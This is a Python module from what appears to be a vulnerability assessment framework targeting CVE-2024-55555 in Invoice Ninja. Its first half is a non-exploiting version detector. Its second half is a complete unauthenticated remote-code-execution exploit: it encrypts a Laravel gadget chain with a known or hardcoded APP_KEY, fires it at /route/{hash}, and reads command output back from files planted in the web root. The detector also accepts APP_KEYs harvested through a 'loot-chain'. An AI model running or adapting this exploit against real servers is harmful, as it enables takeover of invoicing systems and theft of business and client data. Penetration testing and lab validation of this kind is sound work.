#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2024-55555')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2024-55555 — Invoice Ninja insecure deserialization (PHP Object Injection) via /route/{hash}
SAFE DETECTOR (NO EXPLOITATION)

Summary:
    Invoice Ninja's client routes (routes/client.php) expose GET /route/{hash}, which decrypts the
    user-supplied {hash} with Laravel's decrypt(). Laravel's decrypt() unconditionally calls
    unserialize() on the decrypted plaintext, so an attacker who knows the app's APP_KEY can encrypt
    a serialized PHP gadget chain and trigger Object Injection -> RCE. The precondition is a known
    APP_KEY (leaked/committed/default), so the network reachability is unauthenticated. Patched in
    5.10.43, which simply REMOVES the vulnerable /route/{hash} route from routes/client.php.

    Affected: 5.8.22 <= version < 5.10.43  (CWE-502). NVD: CVE-2024-55555.

SAFE Detection (this module performs NO exploitation):
    + Fingerprint the app via the X-APP-VERSION response header (Invoice Ninja emits it via middleware).
    + Bounded version-range check: vulnerable iff 5.8.22 <= v < 5.10.43.
    + Probe that the /route/<token> endpoint is wired (does not 404 like an unknown path), as a
      corroborating signal — sends only an inert non-decryptable token, never a real ciphertext.
    - No APP_KEY is supplied, no encrypted payload is crafted, no unserialize() is triggered.

Marker discipline (the lifecycle harness keys on these substrings):
    "Detected" / "VULNERABLE" on a hit, "not detected" on a miss.
"""

import re
import requests

from modules.core import http_config
from modules.core.http_config import app_url, normalize_base

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# Invoice Ninja stamps its version on responses via the X-APP-VERSION header.
APP_VERSION_HEADER = "x-app-version"
# Fallbacks: some deployments leak the version in the React bootstrap / health JSON.
BODY_VERSION_RE = re.compile(r"[\"']?(?:app[_-]?version|version)[\"']?\s*[:=]\s*[\"']?(\d+\.\d+\.\d+)", re.IGNORECASE)

# Fingerprint that the target is Invoice Ninja at all.
NINJA_MARKERS_RE = re.compile(r"invoice\s*ninja|invoiceninja|x-ninja-token", re.IGNORECASE)

# Affected range: [5.8.22, 5.10.43)
VULN_LOWER = (5, 8, 22)   # inclusive
VULN_UPPER = (5, 10, 43)  # exclusive (patched)

PROBE_PATHS = ["/", "/login", "/health"]


def _safe_get(sess, url, timeout=8, allow_redirects=True):
    try:
        return sess.get(url, timeout=timeout, verify=False, allow_redirects=allow_redirects)
    except Exception:
        return None


def _parse_version(v):
    try:
        parts = tuple(int(x) for x in v.strip().split(".")[:3])
        if len(parts) == 3:
            return parts
    except Exception:
        pass
    return None


def _in_vuln_range(version_tuple):
    """vulnerable iff 5.8.22 <= v < 5.10.43"""
    if not version_tuple:
        return False
    return VULN_LOWER <= version_tuple < VULN_UPPER


def _probe_route_sink(sess, base, timeout=8):
    """Probe the vulnerable /route/{hash} sink with an inert, non-decryptable token.

    The hardened lab blocks this prefix at the web tier and returns a plain 404 before PHP. A live
    vulnerable route should reach application code and return something other than that edge 404.
    """
    url = app_url(base, "/route/lvc-inert-route-probe")
    r = _safe_get(sess, url, timeout=timeout, allow_redirects=False)
    if r is None:
        return {"url": url, "state": "unknown", "reason": "no response"}
    body = r.text or ""
    blocked = r.status_code == 404 and not NINJA_MARKERS_RE.search(body)
    return {
        "url": url,
        "state": "blocked" if blocked else "reachable",
        "status": r.status_code,
        "body_head": body[:160],
    }


def scan(target_url, *, session=None, username=None, password=None, app_key=None, **kwargs):
    sess = session or http_config.get_auth_session()
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url
    base = normalize_base(target_url)

    result = {
        "cve_id": "CVE-2024-55555",
        "name": "Invoice Ninja /route/{hash} insecure deserialization (PHP Object Injection -> RCE)",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "version": None,
        "endpoint": None,
        "evidence": [],
        "detection_methods": [],
        "error": None,
        # Network-reachable without login, but RCE requires a known/leaked APP_KEY.
        "requires_app_key": True,
    }

    # Loot-chain consumption: this CVE's RCE precondition is a known APP_KEY. A key harvested
    # earlier this run (forwarded by the detect-all loot-chain) satisfies the secret precondition,
    # but it is not a positive verdict until the /route/{hash} sink is still wired.
    if app_key:
        result["app_key_used"] = app_key
        result["requires_app_key"] = False
        result["detection_methods"].append("app_key_chained")
        result["evidence"].append(
            f"APP_KEY supplied via loot-chain ({app_key[:12]}…) — deserialization RCE is forge-ready")
        result.setdefault("artifacts", {})["app_key"] = app_key

    version = None
    is_ninja = False

    # ----------------------------------------------------------------------
    # Step 1 — fingerprint Invoice Ninja and read the X-APP-VERSION header.
    # ----------------------------------------------------------------------
    for path in PROBE_PATHS:
        r = _safe_get(sess, app_url(base, path))
        if r is None:
            continue

        hdr = {k.lower(): v for k, v in r.headers.items()}
        if APP_VERSION_HEADER in hdr:
            version = _parse_version(hdr[APP_VERSION_HEADER])
            result["version"] = hdr[APP_VERSION_HEADER].strip()
            result["evidence"].append(f"X-APP-VERSION header on {path}: {hdr[APP_VERSION_HEADER]}")
            result["detection_methods"].append("x_app_version_header")
            is_ninja = True

        body = r.text or ""
        if NINJA_MARKERS_RE.search(body) or "x-ninja-token" in hdr:
            is_ninja = True
            if result["verdict"] == "not_detected":
                result["status"] = "surface_present"
                result["verdict"] = "surface_present"
                result["proof_type"] = "fingerprint"
            if "ninja_fingerprint" not in result["detection_methods"]:
                result["detection_methods"].append("ninja_fingerprint")

        if version is None:
            m = BODY_VERSION_RE.search(body)
            if m:
                version = _parse_version(m.group(1))
                if version:
                    result["version"] = m.group(1)
                    result["evidence"].append(f"version string in body on {path}: {m.group(1)}")
                    result["detection_methods"].append("body_version_extraction")

        if version is not None:
            break

    if not is_ninja and version is None:
        result["evidence"].append("Invoice Ninja not detected")
        return result

    result["endpoint"] = app_url(base, "/route/{hash}")

    # Step 2 — bounded version verdict (5.8.22 <= v < 5.10.43).
    if version is not None:
        if _in_vuln_range(version):
            route_probe = _probe_route_sink(sess, base)
            result.setdefault("artifacts", {})["route_probe"] = route_probe
            result["detection_methods"].append("route_sink_probe")
            if route_probe.get("state") == "blocked":
                result["status"] = "blocked_by_control"
                result["verdict"] = "blocked_by_control"
                result["proof_type"] = "route_control"
                result["evidence"].append(
                    f"/route/{{hash}} sink blocked before PHP (HTTP {route_probe.get('status')})")
                return result
            result["status"] = "precondition_detected" if app_key else "version_applicable"
            result["verdict"] = "precondition_detected" if app_key else "version_applicable"
            result["proof_type"] = "preconditions" if app_key else "version"
            result["evidence"].append(
                f"version {result['version']} within affected range [5.8.22, 5.10.43) — applicable "
                f"to /route/{{hash}} deserialization when APP_KEY is known"
            )
            result["detection_methods"].append("version_range_assessment")
        else:
            result["status"] = "blocked_by_control"
            result["verdict"] = "blocked_by_control"
            result["proof_type"] = "version"
            result["evidence"].append(
                f"version {result['version']} outside affected range [5.8.22, 5.10.43) — not detected as vulnerable"
            )
    else:
        result["evidence"].append("Invoice Ninja detected but version could not be extracted (X-APP-VERSION absent)")

    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2024-55555 exploitation half — Invoice Ninja /route/{hash} deserialization RCE.

Split from the original modules/cve_2024_55555.py (detection half: modules/cves/cve_2024_55555.py).
Exploitation may import from modules root (shared infra) and modules.detection.
"""

import hashlib
import hmac

import requests

from modules.core import http_config
from modules.core.http_config import app_url, normalize_base
from modules.helpers.pipeline import is_forced_execution

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# =============================================================================
# EXPLOIT (per /tmp/EXPLOIT_CONTRACT.md) — deserialize_rce, command-capable,
# app_key-gated, UNAUTHENTICATED (network reachability needs no login; the sole
# gating secret is a known/leaked/default APP_KEY).
#
# Bug: Invoice Ninja's routes/client.php wires GET /route/{hash}; the handler runs
# Laravel decrypt($hash). decrypt() unconditionally unserialize()s the decrypted
# plaintext (framework default), so an attacker who knows APP_KEY can encrypt a
# serialized PHP POP gadget and trigger Object Injection -> __destruct -> RCE.
#
# Pure-HTTP (contract): the gadget is hand-built in Python (NO phpggc / NO php CLI /
# NO docker exec) as a byte-accurate copy of phpggc's Laravel/RCE22 chain (the
# version-matched chain for the lab's laravel/framework v11.15.0 — verified
# byte-identical to `phpggc Laravel/RCE22 system <cmd>`). It is then encrypted
# off-box with ONLY the known APP_KEY, reproducing Illuminate\Encryption\Encrypter
# ::encrypt(value, serialize=false): AES-256-CBC + HMAC-SHA256(iv_b64 . value_b64),
# outer base64(json{iv,value,mac,tag}). This is exactly the leaked-key remote attack.
#
# BLIND sink: GET /route/{hash} does NOT echo command output (the gadget fires in
# __destruct even when the handler then 500s, and Invoice Ninja's SPA catch-all 200s
# arbitrary paths so the fire's HTTP status is meaningless). To CAPTURE OUTPUT over
# pure HTTP we make the command write its stdout to web-served file(s) and GET them
# back — verbatim, un-fakeable proof of arbitrary command execution. Success ONLY if
# that readback returns real output (e.g. a uid= line for `id`).
#
# Requires pycryptodome (AES). If absent, refuse honestly (no fabrication).
# =============================================================================

# Lab's baked-in fixed APP_KEY (committed on purpose — models the leaked-key
# precondition). In the real world this is whatever APP_KEY the attacker obtained.
_LAB_APP_KEY = "base64:RR++yx2rJ9kdxbdh3+AmbHLDQu+Q76i++co9Y8ybbno="

# phpggc Laravel/RCE22: function="system", parameter=<the shell command>.
_RCE_CHAIN = "Laravel/RCE22 (PendingBroadcast -> CommonMark Environment/PrioritizedList/ListenerData -> ChainedBatchTruthTest -> Channel)"

# The published FPM image installs the app at /var/www/app; nginx root is public/.
_APP_PATH = "/var/www/app"

# Proof markers for the readback.
_RCE_MARKERS = ("uid=", "gid=", "groups=", "Linux ", "GNU/Linux", "root:x:")


from modules.generators.php_gadgets import build_rce22 as build_rce22_gadget


def _normalize_key(raw):
    """Accept a raw or 'base64:'-prefixed APP_KEY; return the raw 32-byte key."""
    if not raw:
        return None
    import base64 as _b64
    raw = raw.strip().strip('"').strip("'")
    if raw.startswith("base64:"):
        return _b64.b64decode(raw[len("base64:"):])
    return raw.encode()


def laravel_encrypt(plaintext: bytes, key: bytes) -> str:
    """Reproduce Illuminate\\Encryption\\Encrypter::encrypt(value, serialize=false)
    for AES-256-CBC: base64( json{iv, value, mac=HMAC-SHA256(iv_b64 . value_b64),
    tag:''} ). serialize=false because the gadget bytes are ALREADY a serialized
    object; the server-side decrypt() default unserialize=true does the unserialize.
    Raises ImportError if pycryptodome is missing."""
    import base64 as _b64
    import json as _json
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad

    import os as _os
    iv = _os.urandom(16)
    ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plaintext, 16))
    iv_b64 = _b64.b64encode(iv).decode()
    val_b64 = _b64.b64encode(ct).decode()
    mac = hmac.new(key, (iv_b64 + val_b64).encode(), hashlib.sha256).hexdigest()
    payload = {"iv": iv_b64, "value": val_b64, "mac": mac, "tag": ""}
    return _b64.b64encode(_json.dumps(payload).encode()).decode()


def exploit(target_url, *, username=None, password=None, command=None, options=None, session=None, **kwargs):
    """Attempt CVE-2024-55555 deserialization RCE over pure HTTP.

    deserialize_rce / command-capable / app_key-gated / UNAUTHENTICATED.
    Returns the contract dict; never raises.
    """
    import os as _os
    import time as _time
    import urllib.parse as _url

    sess = session or http_config.get_auth_session()
    options = options or {}
    forced = is_forced_execution(options, **kwargs)
    cmd = command or "echo CVE-2024-55555 PoC && id && hostname"

    result = {
        "cve": "CVE-2024-55555",
        "attempted": True,
        "success": False,
        "vuln_class": "deserialize_rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": ["app_key"],   # always honest: a known APP_KEY is the precondition
        "reason": "",
    }

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url
    base = normalize_base(target_url)

    # --- crypto dependency (no fabrication if missing) ---
    try:
        import Crypto  # noqa: F401  (pycryptodome)
    except Exception:
        result["requires"] = ["python:pycryptodome", "app_key"]
        result["reason"] = (
            "exploitation needs AES-256-CBC (pip install pycryptodome); "
            "package unavailable in this environment"
        )
        result["detail"] = "cannot Laravel-encrypt the gadget without pycryptodome"
        return result

    # --- APP_KEY (documented precondition) ---
    supplied = _normalize_key(options.get("app_key"))
    if supplied is None:
        result["attempted"] = forced
        result["reason"] = "APP_KEY required; pass --app-key explicitly"
        result["detail"] = (
            "forced execution reached APP_KEY material precondition; no APP_KEY supplied"
            if forced else "no APP_KEY supplied"
        )
        return result
    used_lab_default = options.get("app_key") == _LAB_APP_KEY
    key = supplied
    if not key or len(key) != 32:
        result["reason"] = "APP_KEY missing or not 32 bytes (AES-256 requires a 32-byte key)"
        result["detail"] = "invalid APP_KEY"
        return result

    # --- blind-RCE readback plan: write stdout to web-served paths, GET them back ---
    nonce = "pwn_%d_%d" % (int(_time.time()), _os.getpid())
    # Candidate filesystem write targets (the command tees to all that are writable)
    # and the matching web-served readback URLs nginx will return.
    write_targets = [
        "%s/public/%s" % (_APP_PATH, nonce),               # root is public/  -> GET /<nonce>
        "%s/public/storage/%s" % (_APP_PATH, nonce),       # storage:link     -> GET /storage/<nonce>
        "%s/storage/app/public/%s" % (_APP_PATH, nonce),   # symlink target   -> GET /storage/<nonce>
    ]
    readback_urls = [
        "%s/%s" % (base, nonce),
        "%s/storage/%s" % (base, nonce),
    ]
    # Shell command: run `cmd`, capture output once, tee to every candidate path.
    out_marker = "===RCE_%s===" % nonce
    # PHP system() already runs the string via /bin/sh -c, so we pass this shell
    # snippet directly as the gadget's `parameter`.
    full_cmd = "OUT=$(%s 2>&1); for f in %s; do printf '%%s\\n%%s\\n' '%s' \"$OUT\" > \"$f\" 2>/dev/null; done" % (
        cmd, " ".join(write_targets), out_marker
    )

    # --- build + encrypt the gadget ---
    try:
        gadget = build_rce22_gadget("system", full_cmd)
        cipher = laravel_encrypt(gadget, key)
    except Exception as e:
        result["reason"] = "payload/crypto build failed: %s" % e
        result["detail"] = "could not construct the encrypted gadget"
        return result

    result["artifacts"] = {
        "sink": app_url(base, "/route/{hash}"),
        "method": "GET",
        "chain": _RCE_CHAIN,
        "app_key_source": "lab-default" if used_lab_default else "options",
        "gadget_len": len(gadget),
        "cipher_preview": cipher[:64] + "...",
        "command": cmd,
        "nonce": nonce,
        "readback_urls": readback_urls,
    }

    # --- pre-fire: confirm the readback files are ABSENT (causal proof) ---
    for u in readback_urls:
        try:
            pre = sess.get(u, timeout=10, verify=False)
            if pre.status_code == 200 and out_marker in (pre.text or ""):
                # stale artifact from a prior run -> pick a fresh nonce rather than false-positive
                result["reason"] = "stale proof artifact present pre-fire; rerun with a fresh nonce"
                result["detail"] = "aborted to avoid a false positive"
                return result
        except Exception:
            pass

    # --- fire GET /route/<url-encoded cipher> ---
    enc = _url.quote(cipher, safe="")
    try:
        fire = sess.get(app_url(base, "/route/" + enc), timeout=30, verify=False,
                            allow_redirects=False,
                            headers={"User-Agent": http_config.BROWSER_USER_AGENT, "X-lvcscan": "CVE-2024-55555"})
        fire_status = fire.status_code
    except Exception as e:
        result["reason"] = "target unreachable when firing /route/{hash}: %s" % e
        result["detail"] = "no HTTP response from the deserialization sink"
        return result

    # --- readback: GET the web-served proof file(s) for verbatim output ---
    proof = ""
    hit_url = None
    for u in readback_urls:
        try:
            rb = sess.get(u, timeout=12, verify=False)
        except Exception:
            continue
        text = rb.text or ""
        if rb.status_code == 200 and out_marker in text:
            # strip the marker line, keep the command output
            body = text.split(out_marker, 1)[1].strip()
            if body:
                proof = body
                hit_url = u
                break
        if rb.status_code == 200 and any(m in text for m in _RCE_MARKERS) and "<html" not in text.lower():
            proof = text.strip()
            hit_url = u
            break

    if proof:
        result["success"] = True
        result["evidence"] = proof[:1000]
        result["artifacts"]["webshell_url"] = hit_url
        result["detail"] = (
            "UNAUTHENTICATED RCE: RCE22 gadget detonated via GET /route/{hash} "
            "(fire HTTP %s); system(%r) output captured by reading back %s"
            % (fire_status, cmd, hit_url)
        )
        return result

    # --- failed: gadget fired, no readable output ---
    result["success"] = False
    result["detail"] = (
        "encrypted gadget fired at /route/{hash} (HTTP %s) but no proof file was "
        "readable back" % fire_status
    )
    result["reason"] = (
        "no captured command output. Likely causes: route patched/removed (5.10.43 "
        "drops the /route/{hash} sink), wrong APP_KEY, gadget chain mismatch vs the "
        "installed laravel/framework, or the command could not write to a web-served "
        "path (public/ not writable and no storage symlink). The fire's HTTP status is "
        "non-discriminating (SPA catch-all 200s arbitrary paths)."
    )
    return result
